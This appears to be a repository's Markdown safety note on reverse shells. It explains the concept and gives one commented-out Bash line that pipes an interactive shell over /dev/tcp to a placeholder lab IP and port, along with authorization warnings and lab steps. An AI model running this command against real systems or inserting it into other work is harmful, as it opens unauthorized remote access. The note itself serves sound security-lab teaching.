# Reverse Shell Safety Note

> [!CAUTION]
> Use reverse-shell techniques only in systems you own or are explicitly authorized to test. Never point this pattern at a third-party host or run it on a production system.

## Concept

A reverse shell makes the tested machine initiate an outbound connection to a listener controlled by the authorized tester. It is commonly used in isolated security labs to demonstrate command execution and network egress behavior.

The original repository stored this as an executable top-level shell script. Keeping it as documentation makes the intent and safety boundary explicit while preventing accidental execution.

## Bash Pattern

```bash
# Remove the leading comment only inside an authorized lab.
# bash -i >& /dev/tcp/<AUTHORIZED_LAB_IP>/<PORT> 0>&1
```

Replace the placeholders and remove the comment only inside an isolated lab. The command relies on Bash's `/dev/tcp` behavior and is not portable POSIX `sh` syntax.

Before using it in an authorized exercise:

1. Confirm the target and listener are both part of the permitted lab.
2. Use an isolated network and a disposable environment.
3. Start the lab-provided listener on the approved address and port.
4. Run the command only for the duration of the exercise.
5. Stop the listener and remove temporary lab artifacts when finished.
